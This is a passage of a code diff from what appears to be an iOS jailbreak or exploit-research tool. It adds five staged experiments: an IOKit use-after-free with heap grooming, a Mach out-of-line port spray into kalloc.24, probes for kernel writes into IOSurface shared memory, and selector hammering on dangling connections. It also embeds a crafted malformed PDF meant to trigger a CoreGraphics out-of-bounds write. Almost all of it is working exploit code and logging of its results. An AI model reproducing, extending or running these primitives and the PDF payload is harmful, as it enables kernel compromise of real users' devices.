+                    sym_open(svc, mach_task_self(), 0, &conn1);
+                    sym_open(svc, mach_task_self(), 0, &conn2);
+                    sym_open(svc, mach_task_self(), 0, &groomConn);
+
+                    if (conn1 && conn2 && groomConn) {
+                        uint64_t regIn[3] = {surfID, 0, 0};
+                        unsigned int wp = jb41_newWakePort();
+                        jb41_callSel(conn1, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                        jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                        // Deregister conn1 → free slot
+                        uint64_t deregIn[3] = {0, 0, 0};
+                        jb41_callSel(conn1, 18, deregIn, 24, 0, wp, sym_call, sym_async);
+
+                        // Groom with surfID as f[0]
+                        unsigned int gPorts[32];
+                        int gCount = 0;
+                        jb42_groomWithFields(groomConn, surfID, 0x5151515151515151ull,
+                                             (uint64_t)(uintptr_t)surfRef, 0xBBBBBBBBBBBBBBBBull,
+                                             24, 32, gPorts, &gCount, sym_async);
+
+                        // Check conn2 dup — should be 0x0 (using groomed data)
+                        int dupRc = jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                        // Try setting property through the surface AFTER UAF
+                        int32_t v3 = 0xBEEF;
+                        CFNumberRef postUafVal = CFNumberCreate(NULL, kCFNumberSInt32Type, &v3);
+                        sym_surfSetVal(surfRef, testKey, postUafVal);
+                        if (postUafVal) CFRelease(postUafVal);
+
+                        void *postRead = sym_surfCopyVal(surfRef, testKey);
+                        int32_t v4 = 0;
+                        if (postRead) {
+                            CFNumberGetValue(postRead, kCFNumberSInt32Type, &v4);
+                            CFRelease(postRead);
+                        }
+
+                        // Check if copyAllValues reveals kernel-side data
+                        int allValCount = 0;
+                        if (sym_surfCopyAll) {
+                            void *allVals = sym_surfCopyAll(surfRef);
+                            if (allVals) {
+                                allValCount = (int)CFDictionaryGetCount(allVals);
+                                CFRelease(allVals);
+                            }
+                        }
+
+                        log([NSString stringWithFormat:@"JB51: [N1] dupRc=0x%x postUafProp=0x%x allValCnt=%d groom=%d", (uint32_t)dupRc, v4, allValCount, gCount]);
+
+                        if (v4 != 0xBEEF || allValCount > 5) {
+                            n1Hits += 2;
+                            log(@"JB51: [N1] ANOMALY — property mismatch or extra vals post-UAF");
+                        }
+
+                        jb42_freeGroom(gPorts, gCount);
+                        jb41_dropPort(wp);
+                        sym_close(conn1);
+                        sym_close(conn2);
+                        sym_close(groomConn);
+                    }
+
+                    sym_surfRemVal(surfRef, testKey);
+                }
+                sym_cfRelease(surfRef);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB51: [N1] EXC: %@", e.reason]);
+        }
+        results[@"n1_propOracle"] = @(n1Hits);
+
+        if (isr_stopped()) { done(results); sym_release(svc); return; }
+
+        // ===== N2: Fixed OOL Port Spray into kalloc.24 =====
+        log(@"JB51: ===== N2: Fixed OOL Port Spray kalloc.24 =====");
+        @try {
+            // Fix: use correct mach_msg structure with inline body
+            unsigned int holdPorts[64];
+            int holdCount = 0;
+            for (int i = 0; i < 64; i++) {
+                unsigned int p = 0;
+                if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
+                    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+                    holdPorts[holdCount++] = p;
+                }
+            }
+            log([NSString stringWithFormat:@"JB51: [N2] allocated %d hold ports", holdCount]);
+
+            // Create target ports for receiving the sprayed messages
+            unsigned int sprayTargets[8];
+            int sprayCount = 0;
+            for (int i = 0; i < 8; i++) {
+                unsigned int p = 0;
+                if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
+                    sprayTargets[sprayCount++] = p;
+                }
+            }
+
+            // Spray OOL ports — 3 ports × 8 bytes = 24 bytes → kalloc.24
+            int sentOk = 0;
+            for (int i = 0; i < sprayCount && i < 8; i++) {
+                for (int j = 0; j < 8; j++) {
+                    // Build message with OOL ports descriptor
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_ports_descriptor_t desc;
+                    } msg;
+                    memset(&msg, 0, sizeof(msg));
+
+                    // Pick 3 ports for this spray
+                    unsigned int sprayPorts[3];
+                    sprayPorts[0] = holdPorts[j % holdCount];
+                    sprayPorts[1] = holdPorts[(j + 1) % holdCount];
+                    sprayPorts[2] = holdPorts[(j + 2) % holdCount];
+
+                    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                    msg.hdr.msgh_size = sizeof(msg);
+                    msg.hdr.msgh_remote_port = sprayTargets[i];
+                    msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                    msg.hdr.msgh_id = 0x51510000 + j;
+
+                    msg.body.msgh_descriptor_count = 1;
+
+                    msg.desc.address = sprayPorts;
+                    msg.desc.count = 3;
+                    msg.desc.disposition = MACH_MSG_TYPE_COPY_SEND;
+                    msg.desc.deallocate = 0;
+                    msg.desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+                    kern_return_t kr = mach_msg(&msg.hdr,
+                                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                                sizeof(msg), 0, MACH_PORT_NULL,
+                                                100, MACH_PORT_NULL);
+                    if (kr == KERN_SUCCESS) sentOk++;
+                }
+            }
+            log([NSString stringWithFormat:@"JB51: [N2] sent=%d/%d OOL port msgs", sentOk, sprayCount * 8]);
+
+            if (sentOk > 0) {
+                // Now do UAF + dup to see if any port name lands in the groomed slot
+                unsigned int conn1 = 0, conn2 = 0, groomConn = 0;
+                sym_open(svc, mach_task_self(), 0, &conn1);
+                sym_open(svc, mach_task_self(), 0, &conn2);
+                sym_open(svc, mach_task_self(), 0, &groomConn);
+
+                if (conn1 && conn2 && groomConn) {
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t regIn[3] = {0x51, 0, 0};
+                    jb41_callSel(conn1, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                    // Free slot
+                    uint64_t deregIn[3] = {0, 0, 0};
+                    jb41_callSel(conn1, 18, deregIn, 24, 0, wp, sym_call, sym_async);
+
+                    // Don't groom — let OOL port names fill the slot
+                    usleep(50000);
+
+                    int dupRc = jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                    log([NSString stringWithFormat:@"JB51: [N2] dup after OOL spray rc=0x%x", (uint32_t)dupRc]);
+
+                    if ((uint32_t)dupRc != 0xE00002C9 && (uint32_t)dupRc != 0) {
+                        n2Hits++;
+                        log([NSString stringWithFormat:@"JB51: [N2] ANOMALY — unexpected dup rc 0x%x post-OOL", (uint32_t)dupRc]);
+                    }
+                    if ((uint32_t)dupRc == 0) {
+                        n2Hits++;
+                        log(@"JB51: [N2] OOL data landed in UAF slot — dup=0x0");
+                    }
+
+                    jb41_dropPort(wp);
+                    sym_close(conn1);
+                    sym_close(conn2);
+                    sym_close(groomConn);
+                }
+            }
+
+            // Cleanup hold ports
+            for (int i = 0; i < holdCount; i++) {
+                mach_port_mod_refs(mach_task_self(), holdPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+            for (int i = 0; i < sprayCount; i++) {
+                mach_port_mod_refs(mach_task_self(), sprayTargets[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB51: [N2] EXC: %@", e.reason]);
+        }
+        results[@"n2_oolSpray"] = @(n2Hits);
+
+        if (isr_stopped()) { done(results); sym_release(svc); return; }
+
+        // ===== N3: Shared Memory Kernel Write Detection =====
+        log(@"JB51: ===== N3: Shared Memory Write Detection =====");
+        @try {
+            NSDictionary *surfProps = @{
+                @"IOSurfaceWidth": @(64),
+                @"IOSurfaceHeight": @(1),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceAllocSize": @(4096)
+            };
+            void *surfRef = sym_surfCreate((__bridge void *)surfProps);
+            if (surfRef) {
+                uint32_t surfID = sym_surfGetID(surfRef);
+                sym_surfLock(surfRef, 3, NULL);
+                volatile uint64_t *base = (volatile uint64_t *)sym_surfGetBase(surfRef);
+                size_t allocSz = sym_surfGetAlloc(surfRef);
+
+                if (base && allocSz >= 4096) {
+                    // Fill with sentinel pattern
+                    int qwords = (int)(allocSz / 8);
+                    if (qwords > 512) qwords = 512;
+                    for (int i = 0; i < qwords; i++) {
+                        base[i] = 0xAAAAAAAAAAAAAAAAull + (uint64_t)i;
+                    }
+
+                    log([NSString stringWithFormat:@"JB51: [N3] surfID=%u base=%p allocSz=%zu filled %d qwords", surfID, (void *)base, allocSz, qwords]);
+
+                    // Do UAF with surfID — groom fake object whose f[2] = base address
+                    unsigned int conn1 = 0, conn2 = 0, groomConn = 0;
+                    sym_open(svc, mach_task_self(), 0, &conn1);
+                    sym_open(svc, mach_task_self(), 0, &conn2);
+                    sym_open(svc, mach_task_self(), 0, &groomConn);
+
+                    if (conn1 && conn2 && groomConn) {
+                        unsigned int wp = jb41_newWakePort();
+                        uint64_t regIn[3] = {surfID, 0, 0};
+                        jb41_callSel(conn1, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                        jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                        // Deregister conn1
+                        uint64_t deregIn[3] = {0, 0, 0};
+                        jb41_callSel(conn1, 18, deregIn, 24, 0, wp, sym_call, sym_async);
+
+                        // Groom: f[2] = base address of shared mem
+                        unsigned int gPorts[32];
+                        int gCount = 0;
+                        jb42_groomWithFields(groomConn, 0x1, 0x5151515151515151ull,
+                                             (uint64_t)(uintptr_t)base, surfID,
+                                             24, 32, gPorts, &gCount, sym_async);
+
+                        // Dup on conn2 to trigger re-registration with groom data
+                        int dupRc = jb41_callSel(conn2, 17, regIn, 24, 1, wp, sym_call, sym_async);
+                        log([NSString stringWithFormat:@"JB51: [N3] dupRc=0x%x groom=%d", (uint32_t)dupRc, gCount]);
+
+                        // Try selectors on conn2 that might cause kernel to write through groomed data
+                        for (uint32_t sel = 0; sel <= 5; sel++) {
+                            uint64_t tryIn[3] = {0, 0, 0};
+                            int tryRc = sym_call(conn2, sel, NULL, 0, tryIn, 24, NULL, NULL, NULL, NULL);
+                            if ((uint32_t)tryRc != 0xE00002C2) {
+                                log([NSString stringWithFormat:@"JB51: [N3] sel%u on groomed conn2 rc=0x%x", sel, (uint32_t)tryRc]);
+                            }
+                        }
+
+                        // Check if any sentinels in shared memory changed
+                        int changed = 0;
+                        uint64_t firstChanged = 0;
+                        int firstIdx = -1;
+                        for (int i = 0; i < qwords; i++) {
+                            uint64_t expected = 0xAAAAAAAAAAAAAAAAull + (uint64_t)i;
+                            if (base[i] != expected) {
+                                if (firstIdx < 0) {
+                                    firstIdx = i;
+                                    firstChanged = base[i];
+                                }
+                                changed++;
+                            }
+                        }
+
+                        log([NSString stringWithFormat:@"JB51: [N3] changed=%d firstIdx=%d firstVal=0x%llx", changed, firstIdx, firstChanged]);
+                        if (changed > 0) {
+                            n3Hits = changed;
+                            log(@"JB51: [N3] KERNEL WRITE DETECTED in shared memory!");
+                        }
+
+                        jb42_freeGroom(gPorts, gCount);
+                        jb41_dropPort(wp);
+                        sym_close(conn1);
+                        sym_close(conn2);
+                        sym_close(groomConn);
+                    }
+                }
+                sym_surfUnlock(surfRef, 3, NULL);
+                sym_cfRelease(surfRef);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB51: [N3] EXC: %@", e.reason]);
+        }
+        results[@"n3_shmemWrite"] = @(n3Hits);
+
+        if (isr_stopped()) { done(results); sym_release(svc); return; }
+
+        // ===== N4: CoreGraphics PDF OOB Write Trigger (CVE-2026-112611) =====
+        log(@"JB51: ===== N4: CoreGraphics PDF OOB Write =====");
+        @try {
+            typedef void*(*cgdataprov_fn)(void*, const void*, size_t, void*);
+            typedef void*(*cgpdfdoc_fn)(void*, void*);
+            typedef void*(*cgpdfdocgetpage_fn)(void*, size_t);
+            typedef void(*cgcontextdrawpdf_fn)(void*, void*, CGRect);
+            typedef void*(*cgcolorspace_fn)(void);
+            typedef void*(*cgbitmapctx_fn)(void*, size_t, size_t, size_t, size_t, void*, uint32_t);
+            typedef void(*cgcontextrelease_fn)(void*);
+            typedef void(*cgcolorspacerelease_fn)(void*);
+            typedef void(*cgpdfdocrelease_fn)(void*);
+            typedef void(*cgdataprovrelease_fn)(void*);
+
+            cgdataprov_fn sym_dpCreate = (cgdataprov_fn)dlsym(RTLD_DEFAULT, "CGDataProviderCreateWithData");
+            cgpdfdoc_fn sym_pdfDoc = (cgpdfdoc_fn)dlsym(RTLD_DEFAULT, "CGPDFDocumentCreateWithProvider");
+            cgpdfdocgetpage_fn sym_pdfPage = (cgpdfdocgetpage_fn)dlsym(RTLD_DEFAULT, "CGPDFDocumentGetPage");
+            cgcontextdrawpdf_fn sym_drawPdf = (cgcontextdrawpdf_fn)dlsym(RTLD_DEFAULT, "CGContextDrawPDFPage");
+            cgcolorspace_fn sym_csCreate = (cgcolorspace_fn)dlsym(RTLD_DEFAULT, "CGColorSpaceCreateDeviceRGB");
+            cgbitmapctx_fn sym_bmpCtx = (cgbitmapctx_fn)dlsym(RTLD_DEFAULT, "CGBitmapContextCreate");
+            cgcontextrelease_fn sym_ctxRel = (cgcontextrelease_fn)dlsym(RTLD_DEFAULT, "CGContextRelease");
+            cgcolorspacerelease_fn sym_csRel = (cgcolorspacerelease_fn)dlsym(RTLD_DEFAULT, "CGColorSpaceRelease");
+            cgpdfdocrelease_fn sym_pdfRel = (cgpdfdocrelease_fn)dlsym(RTLD_DEFAULT, "CGPDFDocumentRelease");
+            cgdataprovrelease_fn sym_dpRel = (cgdataprovrelease_fn)dlsym(RTLD_DEFAULT, "CGDataProviderRelease");
+
+            int hasCG = (sym_dpCreate && sym_pdfDoc && sym_pdfPage && sym_drawPdf &&
+                         sym_csCreate && sym_bmpCtx && sym_ctxRel && sym_csRel) ? 1 : 0;
+            log([NSString stringWithFormat:@"JB51: [N4] CG syms=%d", hasCG]);
+
+            if (hasCG) {
+                // Craft malformed PDF with ShadingType 5 OOB (CVE-2026-112611)
+                // ShadingType 5 = Lattice-form Gouraud-shaded triangle mesh
+                // Trigger: BitsPerCoordinate=32, BitsPerComponent=16 with crafted decode array
+                const char *pdfData =
+                    "%PDF-1.4\n"
+                    "1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
+                    "2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
+                    "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R/Resources<</Shading<</S1 5 0 R>>>>>>endobj\n"
+                    "4 0 obj<</Length 12>>stream\n"
+                    "/S1 sh\n"
+                    "endstream\nendobj\n"
+                    "5 0 obj<</ShadingType 5/ColorSpace/DeviceRGB/BitsPerCoordinate 32/BitsPerComponent 16"
+                    "/VerticesPerRow 2/Decode[0 100 0 100 0 1 0 1 0 1]"
+                    "/DataSource 6 0 R>>endobj\n"
+                    "6 0 obj<</Length 56>>stream\n"
+                    "\x00\x00\x00\x32\x00\x00\x00\x32\xff\xff\x00\x00\x00\x00"
+                    "\x00\x00\x00\x64\x00\x00\x00\x32\x00\x00\xff\xff\x00\x00"
+                    "\x00\x00\x00\x32\x00\x00\x00\x64\x00\x00\x00\x00\xff\xff"
+                    "\x00\x00\x00\x64\x00\x00\x00\x64\xff\xff\xff\xff\xff\xff"
+                    "endstream\nendobj\n"
+                    "xref\n0 7\n"
+                    "0000000000 65535 f \n"
+                    "0000000009 00000 n \n"
+                    "0000000058 00000 n \n"
+                    "0000000115 00000 n \n"
+                    "0000000296 00000 n \n"
+                    "0000000360 00000 n \n"
+                    "0000000566 00000 n \n"
+                    "trailer<</Size 7/Root 1 0 R>>\n"
+                    "startxref\n674\n%%EOF";
+                size_t pdfLen = strlen(pdfData);
+
+                void *dp = sym_dpCreate(NULL, pdfData, pdfLen, NULL);
+                if (dp) {
+                    void *doc = sym_pdfDoc(dp, NULL);
+                    if (doc) {
+                        void *page = sym_pdfPage(doc, 1);
+                        log([NSString stringWithFormat:@"JB51: [N4] pdf page=%p", page]);
+
+                        if (page) {
+                            // Create bitmap context to render into — use IOSurface shared mem as backing
+                            NSDictionary *surfProps2 = @{
+                                @"IOSurfaceWidth": @(100),
+                                @"IOSurfaceHeight": @(100),
+                                @"IOSurfaceBytesPerElement": @(4),
+                                @"IOSurfacePixelFormat": @(0x42475241),
+                                @"IOSurfaceAllocSize": @(40000)
+                            };
+                            void *pdfSurf = sym_surfCreate((__bridge void *)surfProps2);
+                            if (pdfSurf) {
+                                sym_surfLock(pdfSurf, 3, NULL);
+                                void *pdfBase = sym_surfGetBase(pdfSurf);
+                                size_t pdfAllocSz = sym_surfGetAlloc(pdfSurf);
+
+                                // Fill with sentinel
+                                memset(pdfBase, 0xCC, pdfAllocSz > 40000 ? 40000 : pdfAllocSz);
+
+                                void *cs = sym_csCreate();
+                                // kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little = 0x2002
+                                void *ctx = sym_bmpCtx(pdfBase, 100, 100, 8, 400, cs, 0x2002);
+
+                                if (ctx) {
+                                    // Draw the malformed PDF — triggers ShadingType 5 OOB
+                                    sym_drawPdf(ctx, page, CGRectMake(0, 0, 100, 100));
+
+                                    // Check if the write went beyond bounds
+                                    uint8_t *bytes = (uint8_t *)pdfBase;
+                                    int oobWrites = 0;
+                                    // Check area beyond the 100x100x4=40000 rendering area
+                                    // but within the IOSurface allocation
+                                    for (size_t off = 40000; off < pdfAllocSz && off < 40096; off++) {
+                                        if (bytes[off] != 0xCC) {
+                                            oobWrites++;
+                                        }
+                                    }
+                                    // Also check for anomalous patterns in the rendered area
+                                    int anomalous = 0;
+                                    for (int i = 0; i < 40000; i += 4) {
+                                        uint32_t pixel = *(uint32_t *)(bytes + i);
+                                        if (pixel != 0xCCCCCCCC && pixel != 0) {
+                                            anomalous++;
+                                        }
+                                    }
+                                    log([NSString stringWithFormat:@"JB51: [N4] oobWrites=%d anomalous=%d allocSz=%zu", oobWrites, anomalous, pdfAllocSz]);
+                                    n4Hits = oobWrites;
+                                    if (anomalous > 0) {
+                                        log([NSString stringWithFormat:@"JB51: [N4] PDF rendered %d non-zero pixels — shading active", anomalous]);
+                                    }
+
+                                    sym_ctxRel(ctx);
+                                }
+                                if (cs) sym_csRel(cs);
+                                sym_surfUnlock(pdfSurf, 3, NULL);
+                                sym_cfRelease(pdfSurf);
+                            }
+                        }
+                        sym_pdfRel(doc);
+                    } else {
+                        log(@"JB51: [N4] PDF doc create failed — malformed pdf");
+                    }
+                    sym_dpRel(dp);
+                } else {
+                    log(@"JB51: [N4] DataProvider create failed");
+                }
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB51: [N4] EXC: %@", e.reason]);
+        }
+        results[@"n4_pdfOob"] = @(n4Hits);
+
+        if (isr_stopped()) { done(results); sym_release(svc); return; }
+
+        // ===== N5: Combined — UAF + Shared Memory Monitoring + Selector Hammer =====
+        log(@"JB51: ===== N5: Combined UAF + SHMem Monitor + Selector Hammer =====");
+        @try {
+            // Create IOSurface with known pattern
+            NSDictionary *surfProps3 = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceAllocSize": @(4096)
+            };
+            void *monSurf = sym_surfCreate((__bridge void *)surfProps3);
+            if (monSurf) {
+                uint32_t monSurfID = sym_surfGetID(monSurf);
+                sym_surfLock(monSurf, 3, NULL);
+                volatile uint64_t *monBase = (volatile uint64_t *)sym_surfGetBase(monSurf);
+                size_t monAllocSz = sym_surfGetAlloc(monSurf);
+                int monQwords = (int)(monAllocSz / 8);
+                if (monQwords > 512) monQwords = 512;
+
+                // Fill with unique pattern per qword
+                for (int i = 0; i < monQwords; i++) {
+                    monBase[i] = 0x5151000000000000ull | (uint64_t)i;
+                }
+
+                // Open 5 connections for multi-UAF
+                unsigned int conns[5] = {0};
+                for (int i = 0; i < 5; i++) {
+                    sym_open(svc, mach_task_self(), 0, &conns[i]);
+                }
+                unsigned int groomConn = 0;
+                sym_open(svc, mach_task_self(), 0, &groomConn);
+
+                if (conns[0] && conns[1] && conns[2] && conns[3] && conns[4] && groomConn) {
+                    unsigned int wp = jb41_newWakePort();
+
+                    // Register on conns[0..3]
+                    uint64_t regIn[3] = {monSurfID, 0, 0};
+                    for (int i = 0; i < 4; i++) {
+                        jb41_callSel(conns[i], 17, regIn, 24, 1, wp, sym_call, sym_async);
+                    }
+
+                    // Deregister conn0 → free slot
+                    uint64_t deregIn[3] = {0, 0, 0};
+                    jb41_callSel(conns[0], 18, deregIn, 24, 0, wp, sym_call, sym_async);
+
+                    // Groom with controlled data — pointer fields set to IOSurface base
+                    unsigned int gPorts[32];
+                    int gCount = 0;
+                    jb42_groomWithFields(groomConn, 0x1, monSurfID,
+                                         (uint64_t)(uintptr_t)monBase, 0x5151515151515151ull,
+                                         24, 32, gPorts, &gCount, sym_async);
+
+                    // conn1 dup — should read groom data
+                    int d1 = jb41_callSel(conns[1], 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                    // Now deregister conn1 too → double-dangling
+                    jb41_callSel(conns[1], 18, deregIn, 24, 0, wp, sym_call, sym_async);
+
+                    // Re-groom with different data
+                    unsigned int gPorts2[32];
+                    int gCount2 = 0;
+                    jb42_groomWithFields(groomConn, 0x2, 0xDEADDEADDEADDEADull,
+                                         (uint64_t)(uintptr_t)monBase + 64, 0x4242424242424242ull,
+                                         24, 32, gPorts2, &gCount2, sym_async);
+
+                    // conn2 dup — reads NEW groom data
+                    int d2 = jb41_callSel(conns[2], 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                    // conn3 dup
+                    int d3 = jb41_callSel(conns[3], 17, regIn, 24, 1, wp, sym_call, sym_async);
+
+                    // Now hammer selectors on conn2 (using groomed fake entry)
+                    // These might cause kernel to dereference our controlled pointer
+                    int selhits = 0;
+                    for (uint32_t sel = 0; sel <= 16; sel++) {
+                        if (sel == 17 || sel == 18) continue;
+                        uint64_t tryIn[3] = {monSurfID, 0, 0};
+                        int rc = sym_call(conns[2], sel, NULL, 0, tryIn, 24, NULL, NULL, NULL, NULL);
+                        if ((uint32_t)rc != 0xE00002C2) {
+                            selhits++;
+                            log([NSString stringWithFormat:@"JB51: [N5] sel%u on dangling conn2 rc=0x%x", sel, (uint32_t)rc]);
+                        }
+                    }
+
+                    // Also try conn4 (never registered) as a fresh connection calling selectors on the same surfID
+                    int freshHits = 0;
+                    for (uint32_t sel = 0; sel <= 5; sel++) {
+                        uint64_t tryIn[3] = {monSurfID, 0, 0};
+                        uint64_t outScalar[4] = {0};
+                        uint32_t outCnt = 4;
+                        uint8_t outBuf[256];
+                        memset(outBuf, 0, sizeof(outBuf));
+                        size_t outSz = sizeof(outBuf);
+                        int rc = sym_call(conns[4], sel, NULL, 0, tryIn, 24, outScalar, &outCnt, outBuf, &outSz);
+                        if ((uint32_t)rc == 0) {
+                            freshHits++;
+                            // Check output for kernel data
+                            int hasData = 0;
+                            for (int b = 0; b < (int)outSz; b++) {
+                                if (outBuf[b] != 0) { hasData = 1; break; }
+                            }
+                            log([NSString stringWithFormat:@"JB51: [N5] fresh sel%u rc=0x0 outCnt=%u outSz=%zu hasData=%d", sel, outCnt, outSz, hasData]);
+                            if (hasData) n5Hits++;
+                        }
+                    }
+
+                    // Check shared memory for kernel writes
+                    int changed5 = 0;
+                    uint64_t firstChanged5 = 0;
+                    int firstIdx5 = -1;
+                    for (int i = 0; i < monQwords; i++) {
+                        uint64_t expected = 0x5151000000000000ull | (uint64_t)i;
+                        if (monBase[i] != expected) {
+                            if (firstIdx5 < 0) {
+                                firstIdx5 = i;
+                                firstChanged5 = monBase[i];
+                            }
+                            changed5++;
+                        }
+                    }
+
+                    log([NSString stringWithFormat:@"JB51: [N5] d1=0x%x d2=0x%x d3=0x%x selHits=%d freshHits=%d shmChanged=%d", (uint32_t)d1, (uint32_t)d2, (uint32_t)d3, selhits, freshHits, changed5]);
+                    if (changed5 > 0) {
+                        n5Hits += changed5;
+                        log([NSString stringWithFormat:@"JB51: [N5] KERNEL WROTE TO SHMEM! idx=%d val=0x%llx", firstIdx5, firstChanged5]);
+                    }
+
+                    jb42_freeGroom(gPorts, gCount);
+                    jb42_freeGroom(gPorts2, gCount2);
+                    jb41_dropPort(wp);
+                }
+
+                for (int i = 0; i < 5; i++) {
+                    if (conns[i]) sym_close(conns[i]);
+                }
+                if (groomConn) sym_close(groomConn);
+
+                sym_surfUnlock(monSurf, 3, NULL);
+                sym_cfRelease(monSurf);
+            }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB51: [N5] EXC: %@", e.reason]);
+        }
+        results[@"n5_combined"] = @(n5Hits);
+
+        sym_release(svc);
+
+        NSString *verdict;
+        if (n3Hits > 0 || n5Hits > 0) verdict = @"KERNEL_WRITE_SHMEM";
+        else if (n4Hits > 0) verdict = @"PDF_OOB_CONFIRMED";
+        else if (n2Hits > 0) verdict = @"OOL_SPRAY_HIT";
+        else if (n1Hits > 1) verdict = @"PROP_ANOMALY";
+        else if (n1Hits > 0) verdict = @"PROP_ORACLE_OK";
+        else verdict = @"NO_KERNEL_WRITE";
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB51: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB51-shmem-oracle-checkpoint.json", results);
+        done(results);
+    });
+}
